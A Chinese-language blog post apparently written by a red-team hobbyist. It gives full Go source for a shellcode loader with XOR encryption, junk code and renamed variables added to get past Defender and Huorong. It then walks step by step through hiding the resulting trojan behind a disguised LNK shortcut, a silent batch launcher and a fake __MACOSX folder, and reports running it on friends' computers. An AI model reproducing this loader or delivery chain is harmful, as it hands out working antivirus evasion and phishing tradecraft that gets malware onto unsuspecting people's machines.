---
title: "小记go加载器免杀+Lnk文件钓鱼思路"
date: 2025-12-11T00:00:00+08:00
draft: false
---

# 小记go加载器免杀+lnk文件钓鱼思路

本篇文章具有时效性，可能过一两个月这些加载器也跑不掉了

**注:** 本人非专业二进制研究人员，学习免杀仅为日常攻防场景提升对抗资本，如有技术错误欢迎纠正

## 基础加载器

基础格式如下，有cmd弹窗：
~~~go
package main

import (
	"syscall"
	"unsafe"
)

func main() {
	shellcode := []byte{}

	// 1、获取dll
	kernel32 := syscall.MustLoadDLL("kernel32.dll")
	// 2、调用dll的函数
	VirtualAlloc := kernel32.MustFindProc("VirtualAlloc")
	RtlMoveMemory := kernel32.MustFindProc("RtlMoveMemory")
	CreateThread := kernel32.MustFindProc("CreateThread")
	WaitForSingleObject := kernel32.MustFindProc("WaitForSingleObject")
	// 3、申请内存
	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(shellcode)), 0x1000|0x2000, 0x40)
	// 4、复制shellcode到内存中
	RtlMoveMemory.Call(addr, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	// 5、创建线程
	thread, _, _ := CreateThread.Call(0, 0, addr, 0, 0, 0)
	// 6、运行
	WaitForSingleObject.Call(thread, 0xFFFFFFFF)
	// 7.关闭 DLL
	kernel32.Release()
}
~~~

我们可以基于这个基础加载器进行后续的免杀

## 特征隐藏过defender+火绒(2025.9.20)

首先是我们初始的加载器具有一些特征：

* 明文shellcode
* 明显的变量关键字
* 明显的代码逻辑

对此我们可以给出如下方案：

* 变量名使用随机字符串

* 加解密shellcode

* 加入混淆无用代码

那么我们可以得到如下的加载器代码，有cmd弹窗：

~~~go
package main

import (
	"crypto/rand"
	"fmt"
	"math/big"
	"os"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

// 混淆函数 - 生成随机字符串
func qwerty123RandomStr(n int) string {
	letters := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	ret := make([]byte, n)
	for i := 0; i < n; i++ {
		num, _ := rand.Int(rand.Reader, big.NewInt(int64(len(letters))))
		ret[i] = letters[num.Int64()]
	}
	return string(ret)
}

// 混淆函数 - 假的文件操作
func asdf456FakeFileOp() {
	tempFile := qwerty123RandomStr(8) + ".tmp"
	f, _ := os.Create(tempFile)
	f.WriteString(qwerty123RandomStr(100))
	f.Close()
	os.Remove(tempFile)
}

// 混淆函数 - 假的网络检查
func zxcv789FakeNetCheck() bool {
	hostnames := []string{"google.com", "microsoft.com", "github.com"}
	for _, host := range hostnames {
		if strings.Contains(host, "google") {
			return true
		}
	}
	return false
}

// XOR解密函数
func hjkl012DecryptShellcode(encrypted []byte, key byte) []byte {
	decrypted := make([]byte, len(encrypted))
	for i := 0; i < len(encrypted); i++ {
		decrypted[i] = encrypted[i] ^ key
	}
	return decrypted
}

func main() {
	// 混淆代码 - 随机延时
	time.Sleep(time.Duration(100+len(qwerty123RandomStr(5))) * time.Millisecond)

	// 混淆代码 - 假操作
	asdf456FakeFileOp()
	if !zxcv789FakeNetCheck() {
		fmt.Println("Network check failed")
	}

	// 加密的shellcode (需要手动替换为加密后的数据)
	uiop345EncryptedData := []byte{}

	// XOR密钥 (与加密脚本中的密钥保持一致)
	bnm678XorKey := byte(0x99)

	// 解密shellcode
	qwer901DecodedPayload := hjkl012DecryptShellcode(uiop345EncryptedData, bnm678XorKey)

	// 混淆代码 - 无用计算
	vbnm234DummyVar := 0
	for i := 0; i < 1000; i++ {
		vbnm234DummyVar += i * 2
	}

	// 获取系统库
	fghj567SystemLib := syscall.MustLoadDLL("kernel32.dll")

	// 获取API函数
	rtyu890MemAlloc := fghj567SystemLib.MustFindProc("VirtualAlloc")
	yuio123MemCopy := fghj567SystemLib.MustFindProc("RtlMoveMemory")
	dfgh456ThreadCreate := fghj567SystemLib.MustFindProc("CreateThread")
	cvbn789WaitFunc := fghj567SystemLib.MustFindProc("WaitForSingleObject")

	// 混淆代码 - 字符串操作
	poiu345TempStr := qwerty123RandomStr(20)
	if len(poiu345TempStr) > 10 {
		poiu345TempStr = poiu345TempStr[:10]
	}

	// 申请内存空间
	lkjh678MemAddr, _, _ := rtyu890MemAlloc.Call(0, uintptr(len(qwer901DecodedPayload)), 0x1000|0x2000, 0x40)

	// 复制解密后的shellcode到内存
	yuio123MemCopy.Call(lkjh678MemAddr, uintptr(unsafe.Pointer(&qwer901DecodedPayload[0])), uintptr(len(qwer901DecodedPayload)))

	// 混淆代码 - 更多无用操作
	mnbv012Counter := 0
	for mnbv012Counter < 50 {
		mnbv012Counter++
		if mnbv012Counter%10 == 0 {
			time.Sleep(1 * time.Millisecond)
		}
	}

	// 创建执行线程
	qazw345ThreadHandle, _, _ := dfgh456ThreadCreate.Call(0, 0, lkjh678MemAddr, 0, 0, 0)

	// 等待线程执行完成
	cvbn789WaitFunc.Call(qazw345ThreadHandle, 0xFFFFFFFF)

	// 释放系统库
	fghj567SystemLib.Release()

	// 混淆代码 - 最后的无用操作
	for i := 0; i < 100; i++ {
		_ = qwerty123RandomStr(5)
	}
}
~~~

编译时使用`-ldflags -H=windowsgui`参数来隐藏cmd窗口：

~~~cmd
go build -ldflags -H=windowsgui
~~~

截至今天（2025/9/20）测试是可以过火绒的：

![image-20250920161314277](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250920161314277.png)

defender也是：

![image-20250920195430092](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20250920195430092.png)

其他引擎检出率，还是相当可观：

![51dfe4a93d0dbe193112b3db9cf93113](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/51dfe4a93d0dbe193112b3db9cf93113.png)

但是这里360开扫描会杀，所以如果目标群体电脑可能有360的话还需要进一步免杀

## 制作lnk文件钓鱼(2025.11.4)

很久没更新了，试了下发现到现在依然没有被defender和火绒杀掉（2025/11/4），那么继续吧，接下来就是掩人耳目阶段，直接发exe还是没人敢点，我们这里就来伪装一下这个木马，让我的CTF队友电脑上线：

首先创建一个快捷方式，属性这样设置：

![image-20251104004730066](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20251104004730066.png)

其中目标我是这样写的：

~~~cmd
C:\Windows\System32\cmd.exe /c ".\__MACOSX\.note\note.bat" && exit
~~~

图标我挑选的常规文本文档，也可以参考网上的方法改为PDF

接下来我们在同目录创建目录`\__MACOSX\.note`，并在里面放三个东西：一个bat脚本，一个常规txt文件，一个木马

![image-20251104005034155](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20251104005034155.png)

bat脚本的内容如下：
~~~cmd
@echo off
start /b "" ".\__MACOSX\.note\note.exe"
start "" notepad ".\__MACOSX\.note\note.txt"
~~~

这样可以无窗口启动木马，并用记事本打开txt文件

我们可以在txt中写一些引人注意的东西，比如我的队友喜欢做MISC，我就给他来一道隐写题（其实我乱写的，无解）：

![image-20251104005419535](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20251104005419535.png)

接下来回到快捷方式的目录，将`__MACOSX`文件夹及其内容设置为隐藏：

![image-20251104005539325](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20251104005539325.png)

这样被害者就看不到恶意文件夹了，即使发现也会觉得是mac电脑压缩时产生的无用文件

接下来就是打包，注意不要用系统自带压缩功能，一定要用7-zip或者WinRAR，这俩在打包时能保留隐藏文件夹的信息，不然解压后无法隐藏文件夹

完成后我们就可以实现隐蔽的触发木马上线了，发给队友试试：

![image-20251104012512163](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20251104012512163.png)

接下来就是静待上线，没过一会：

![image-20251104012633167](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20251104012633167.png)

哈哈哈很搞笑，看看他是不是还在认真解题：

![9aab2904ab1198b6c6018bdc05d98448](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/9aab2904ab1198b6c6018bdc05d98448.png)

![image-20251104012103099](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20251104012103099.png)

哈哈哈解不出来问豆包了，嘲讽一手：
![image-20251104012255968](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20251104012255968.png)

接下来就是告诉他真相互相问候的片段了，也没有进一步的渗透了

另外批量发给兄弟们测试了一下，都是稳稳上线了：

![QQ_1762226530289](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1762226530289.png)

那么本次钓鱼测试就到此结束，可见lnk文件钓鱼还算是比较隐蔽的一种上线方式，当然也比较侥幸，算准了他们不可能在电脑装360的心理😆

## 一些笔记

### 关于syscall

我们在加载器中使用 `syscall.MustLoadDLL`来获取dll，在某些会被识别的情况下可以尝试这些：
~~~go
kernel32 := syscall.LoadDLL("kernel32.dll")
kernel32 := syscall.FindProc("kernel32.dll")
kernel32 := syscall.MustFindProc("kernel32.dll")
kernel32 := syscall.NewLazyDLL("kernel32.dll")
kernel32 := syscall.NewProc("kernel32.dll")
~~~

除syscall之外我们还可以使用`golang.org/x/sys/windows`的库：
~~~go
kernel32 := windows.NewLazySystemDLL("kernel32.dll")
~~~











